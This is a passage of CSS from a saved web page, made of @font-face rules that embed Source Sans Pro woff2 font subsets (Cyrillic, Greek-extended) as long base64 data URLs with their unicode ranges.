xW6cfxKR+BKAr4UbEwTwy5zQrLPqd3ND6wZwBkDw+3ofkI8zhAUxebjYezmPXN0ANkClSl66wdOw5/IrYca9+BP//f1oqVu7+gN3M1gxruHcUnC5GFbz0I1+ESgwAUtLi8B8eB7i0gZSmgUC0Bn2BIw3LGXHymZzEs8ncNnkYVc9Qs5Ss1hmGsVwRmCHCBWgsvCiCiQVYqf4B5dMbksBf4DcP0XsIDAv4hLdRKRvEs0JH8st1Agx0YtrkuBQMbDlCWCfqtSgqRUVRBWefI8+8AEx5uhlq9avvPFqBPDUXM5esrf/6goOspeI1HEA+EJgAYNlJAIHm5ZwHeyudKxeFA5OnisaXFpQx5bZBl5r9v6NWEoLfytjURVic+Cm+cbayX5nUZFa+ERCRcc4zB5XGROdUvWG0rBoMNiVSYVhapWyMDKxcF1+g3pUVUVldQ09Dxo0K8NxuLGKc1FFWUfPq1I1TKVonnBkp/FgA7FpipFOMvP+NSGSAcMWqlF3gskgxpOZqqgPJvVB/iNJlkU3hRUg2l56olyDIWQcpdgcyDqO4Ea99qBFYypLC3ZWjirdEvl/bqK5c0oaHesSdkZe2LCqFKxElS+HWm4O55RLe2kzHtmoE7TFoE/Z4gMPRdiAT+Mihn9/CnBTEtLyqvrmZJQwuAILwwY+3UBVKKlUTVmVGtSoJjWrRa1q0w3Tsh2X2+P1+QPBUDgSjcUTyVQ6k83lC8VSuVKt1RvNVrvT7fUHw9E45VJbH3Nt5Uf9fw9S6NnGNq7e7oZQqzPQiqUcD49JZJ2BlISyiZbMOlIKQqmo0RHSWGegzV7Ugl6rM9DKiG54bKLojeQkUsz0ZNFfvgt7eipp9cQ00RvpT/cfYzbvFptXbH0/HE6/5yk1LAHV+QqvvgE=)
                    format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xK3dSBYKcSV-LCoeQqfX1RYOo3qPK7lqDY.woff2*/ url(data:font/woff2;base64,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)
                    format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* greek-ext */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xK3dSBYKcSV-LCoeQqfX1RYOo3qNK7lqDY.woff2*/ url(data:font/woff2;base64,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